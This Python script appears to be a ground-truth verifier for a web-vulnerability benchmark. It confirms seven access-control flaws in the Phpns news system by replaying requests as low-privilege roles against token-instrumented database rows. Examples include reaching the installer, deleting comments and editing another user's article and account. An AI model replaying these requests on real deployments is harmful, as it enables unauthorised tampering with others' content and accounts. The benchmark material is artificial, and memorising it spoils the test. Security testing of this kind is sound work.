"""Manual ground-truth verification for Phpns (GT-009 .. GT-015).

Notes:
- user2's current database id is 11 (the CSV text "id=6" refers to the
  original deployment); GT-014/GT-015 are verified against the real id 11.
- Article 6 is user2's seed article, used by GT-010 .. GT-013.
"""

from __future__ import annotations

import json

import verifier as v

APP = "phpns"
USERS = "phpns_users"
ARTICLES = "phpns_articles"
COMMENTS = "phpns_comments"


def gt009(det, db) -> dict:
    """install/index.php — installation guide reachable by a visitor."""
    del db
    r = v.Recorder(APP, "GT-009")
    sess = v.role_session(det, "visitor")
    try:
        resp = v.replay(det, sess, "install/index.php", {"method": "GET", "params": {}, "referer": None})
        body = resp["body"]
        installer_form = ("phpns installation" in body) and ('<form action="index.php?step=' in body)
        body_file = r.save_body("gt009_visitor_install", body)
        r.add("replay", {
            "role": "visitor (no login)",
            "request": "GET install/index.php",
            "status_code": resp["status_code"],
            "installer_db_form_present": installer_form,
            "body_saved": body_file,
        })
    finally:
        v.close_session(sess)
    verdict = "vulnerable" if installer_form else "not_confirmed"
    summary = (f"visitor GET install/index.php returned {resp['status_code']} with the installer "
               f"database-configuration form (installer_db_form_present={installer_form}).")
    return r.finish(verdict, summary)


def gt010(det, db) -> dict:
    """article.php?do=comments&id=6 — 'register' user opens the comment
    moderation interface of article 6 and reads its comments (token proof)."""
    r = v.Recorder(APP, "GT-010", db)
    tok = v.token("comment")
    db.execute(f"UPDATE {COMMENTS} SET comment_text='{tok}' WHERE id=5 AND article_id='6'")
    r.add("instrument", {"table": COMMENTS, "row": "id=5 (comment of article 6)", "column": "comment_text", "token": tok})
    sess = v.role_session(det, "register")
    try:
        resp = v.replay(det, sess, "article.php?do=comments&id=6", {
            "method": "GET", "params": {"do": "comments", "id": "6"}, "referer": None,
        })
        exposed = tok in resp["body"]
        body_file = r.save_body("gt010_register_comments", resp["body"])
        r.add("replay", {
            "role": "register (low-privilege user)",
            "request": "GET article.php?do=comments&id=6",
            "status_code": resp["status_code"],
            "token_exposed_in_response": exposed,
            "body_saved": body_file,
        })
    finally:
        v.close_session(sess)
    verdict = "vulnerable" if exposed else "not_confirmed"
    summary = (f"register GET article.php?do=comments&id=6 returned {resp['status_code']}; "
               f"comment moderation list exposes instrumented comment token={exposed}.")
    return r.finish(verdict, summary)


def gt011(det, db) -> dict:
    """article.php?action=delete&do=comments&id=6 — 'register' deletes a
    comment of article 6 (instrumented token row disappears)."""
    r = v.Recorder(APP, "GT-011", db)
    tok = v.token("delcomment")
    db.execute(
        f"INSERT INTO {COMMENTS} (article_id, comment_text, website, comment_author, timestamp, approved, ip) "
        f"VALUES ('6', '{tok}', '', 'drhlgt', '0', '1', '127.0.0.1')"
    )
    row_id = db.scalar(f"SELECT id FROM {COMMENTS} WHERE comment_text='{tok}' ORDER BY id DESC LIMIT 1")
    exists_before = db.scalar(f"SELECT COUNT(*) FROM {COMMENTS} WHERE id={row_id}")
    r.add("instrument", {"table": COMMENTS, "inserted_row_id": row_id, "article_id": 6, "token": tok,
                         "exists_before": exists_before})
    sess = v.role_session(det, "register")
    try:
        resp = v.replay(det, sess, "article.php?action=delete&do=comments&id=6", {
            "method": "POST",
            "params": {row_id: row_id},
            "referer": "article.php?do=comments&id=6",
        })
        exists_after = db.scalar(f"SELECT COUNT(*) FROM {COMMENTS} WHERE id={row_id}")
        r.add("replay", {
            "role": "register (low-privilege user)",
            "request": f"POST article.php?action=delete&do=comments&id=6 {{{row_id}: {row_id}}}",
            "status_code": resp["status_code"],
            "row_exists_after": exists_after,
            "deleted": (exists_after == "0"),
        })
    finally:
        v.close_session(sess)
    verdict = "vulnerable" if exists_after == "0" else "not_confirmed"
    summary = (f"register POST article.php?action=delete&do=comments&id=6 returned {resp['status_code']}; "
               f"instrumented comment id={row_id} of article 6 was deleted (exists_after={exists_after}).")
    return r.finish(verdict, summary)


def gt012(det, db) -> dict:
    """article.php?do=edit&id=6 — user1 opens the edit interface of user2's
    article (token proof from the article body)."""
    r = v.Recorder(APP, "GT-012", db)
    tok = v.token("article_edit")
    db.execute(f"UPDATE {ARTICLES} SET article_text='{tok}' WHERE id=6")
    r.add("instrument", {"table": ARTICLES, "row": "id=6 (user2's article)", "column": "article_text", "token": tok})
    sess = v.role_session(det, "user1")
    try:
        resp = v.replay(det, sess, "article.php?do=edit&id=6", {
            "method": "GET", "params": {"id": "6", "do": "edit"}, "referer": "manage.php?v=user1",
        })
        exposed = tok in resp["body"]
        body_file = r.save_body("gt012_user1_edit_article6", resp["body"])
        r.add("replay", {
            "role": "user1 (not the article author)",
            "request": "GET article.php?do=edit&id=6",
            "status_code": resp["status_code"],
            "token_exposed_in_edit_form": exposed,
            "body_saved": body_file,
        })
    finally:
        v.close_session(sess)
    verdict = "vulnerable" if exposed else "not_confirmed"
    summary = (f"user1 GET article.php?do=edit&id=6 returned {resp['status_code']}; "
               f"user2's article text token exposed in the edit form={exposed}.")
    return r.finish(verdict, summary)


def _article_row(db) -> dict[str, str]:
    columns = db.rows(f"SHOW COLUMNS FROM {ARTICLES}")
    names = [item[0] for item in columns]
    row = db.rows(f"SELECT * FROM {ARTICLES} WHERE id=6 LIMIT 1")[0]
    return {name: row[index] if index < len(row) else "" for index, name in enumerate(names)}


def gt013(det, db) -> dict:
    """article.php?do=editp — user1 submits an update for user2's article 6:
    article_text token1 -> token2 and article_author becomes user1."""
    r = v.Recorder(APP, "GT-013", db)
    t1 = v.token("art_before")
    t2 = v.token("art_after")
    db.execute(f"UPDATE {ARTICLES} SET article_text='{t1}' WHERE id=6")
    row = _article_row(db)
    r.add("instrument", {"table": ARTICLES, "row": "id=6", "column": "article_text",
                         "token1": t1, "token2": t2, "author_before": row.get("article_author", "")})
    sess = v.role_session(det, "user1")
    try:
        resp = v.replay(det, sess, "article.php?do=editp", {
            "method": "POST",
            "params": {
                "id": "6",
                "article_title": row.get("article_title", ""),
                "article_subtitle": row.get("article_subtitle", ""),
                "article_cat": row.get("article_cat", ""),
                "article_text": t2,
                "article_exptext": row.get("article_exptext", ""),
                "acchecked": "1",
                "achecked": "1",
            },
            "referer": "article.php?do=edit&id=6",
        })
        text_after = db.scalar(f"SELECT article_text FROM {ARTICLES} WHERE id=6")
        author_after = db.scalar(f"SELECT article_author FROM {ARTICLES} WHERE id=6")
        r.add("replay", {
            "role": "user1 (not the article author)",
            "request": "POST article.php?do=editp id=6 article_text=<token2>",
            "status_code": resp["status_code"],
            "db_article_text_before": t1,
            "db_article_text_after": text_after,
            "db_article_author_after": author_after,
            "updated": (text_after == t2),
        })
    finally:
        v.close_session(sess)
    verdict = "vulnerable" if text_after == t2 else "not_confirmed"
    summary = (f"user1 POST article.php?do=editp returned {resp['status_code']}; article 6 "
               f"article_text changed {t1} -> {text_after} (updated={text_after == t2}) and "
               f"article_author became '{author_after}'.")
    return r.finish(verdict, summary)


def gt014(det, db) -> dict:
    """user.php?do=edit&id=11 — user1 opens the account-edit interface of
    user2 (id=11 in the current database; CSV text says id=6)."""
    r = v.Recorder(APP, "GT-014", db)
    tok = v.token("user_edit")
    db.execute(f"UPDATE {USERS} SET full_name='{tok}' WHERE id=11")
    r.add("instrument", {"table": USERS, "row": "id=11 (user2)", "column": "full_name", "token": tok,
                         "note": "CSV endpoint text says id=6; user2's current database id is 11"})
    sess = v.role_session(det, "user1")
    try:
        resp = v.replay(det, sess, "user.php?do=edit&id=11", {
            "method": "GET", "params": {"id": "11", "do": "edit"}, "referer": "user.php",
        })
        exposed = tok in resp["body"]
        body_file = r.save_body("gt014_user1_edit_user11", resp["body"])
        r.add("replay", {
            "role": "user1 (editing another account)",
            "request": "GET user.php?do=edit&id=11",
            "status_code": resp["status_code"],
            "token_exposed_in_edit_form": exposed,
            "body_saved": body_file,
        })
    finally:
        v.close_session(sess)
    verdict = "vulnerable" if exposed else "not_confirmed"
    summary = (f"user1 GET user.php?do=edit&id=11 returned {resp['status_code']}; "
               f"user2's account data token exposed in the edit form={exposed}.")
    return r.finish(verdict, summary)


def _user_row(db) -> dict[str, str]:
    columns = db.rows(f"SHOW COLUMNS FROM {USERS}")
    names = [item[0] for item in columns]
    row = db.rows(f"SELECT * FROM {USERS} WHERE id=11 LIMIT 1")[0]
    return {name: row[index] if index < len(row) else "" for index, name in enumerate(names)}


def gt015(det, db) -> dict:
    """user.php?do=editp — user1 submits an account update for user2 (id=11):
    full_name token1 -> token2."""
    r = v.Recorder(APP, "GT-015", db)
    t1 = v.token("usr_before")
    t2 = v.token("usr_after")
    db.execute(f"UPDATE {USERS} SET full_name='{t1}' WHERE id=11")
    row = _user_row(db)
    r.add("instrument", {"table": USERS, "row": "id=11 (user2)", "column": "full_name",
                         "token1": t1, "token2": t2})
    sess = v.role_session(det, "user1")
    try:
        resp = v.replay(det, sess, "user.php?do=editp", {
            "method": "POST",
            "params": {
                "id": "11",
                "username_": row.get("user_name", ""),
                "fullname": t2,
                "email": row.get("email", ""),
                "msn": row.get("msn", ""),
                "aim": row.get("aim", ""),
                "yahoo": row.get("yahoo", ""),
                "skype": row.get("skype", ""),
                "rank": row.get("rank_id", ""),
                "original_username": row.get("user_name", ""),
            },
            "referer": "user.php?do=edit&id=11",
        })
        fullname_after = db.scalar(f"SELECT full_name FROM {USERS} WHERE id=11")
        r.add("replay", {
            "role": "user1 (editing another account)",
            "request": "POST user.php?do=editp id=11 fullname=<token2>",
            "status_code": resp["status_code"],
            "db_full_name_before": t1,
            "db_full_name_after": fullname_after,
            "updated": (fullname_after == t2),
        })
    finally:
        v.close_session(sess)
    verdict = "vulnerable" if fullname_after == t2 else "not_confirmed"
    summary = (f"user1 POST user.php?do=editp returned {resp['status_code']}; user2 (id=11) "
               f"full_name changed {t1} -> {fullname_after} (updated={fullname_after == t2}).")
    return r.finish(verdict, summary)


def main() -> None:
    cfg, snap, det, db = v.app_context(APP)
    baseline = snap.create()
    results = []
    for fn in (gt009, gt010, gt011, gt012, gt013, gt014, gt015):
        results.append(v.run_record(snap, lambda fn=fn: fn(det, db), baseline, cfg.database))
    (v.app_evidence_dir(APP) / "summary.json").write_text(json.dumps({
        "app": APP,
        "baseline": str(baseline),
        "database_restored_after_each_record": True,
        "restore_verified_per_record": [bool(item.get("restore_verified")) for item in results],
        "final_database_matches_baseline": v.db_matches(cfg.database, baseline),
        "results": results,
    }, ensure_ascii=False, indent=2), encoding="utf-8")
    for item in results:
        print(f"{item['gt_id']}: {item['verdict']} | restored={item.get('restore_verified')} | {item['summary'][:130]}")


if __name__ == "__main__":
    main()
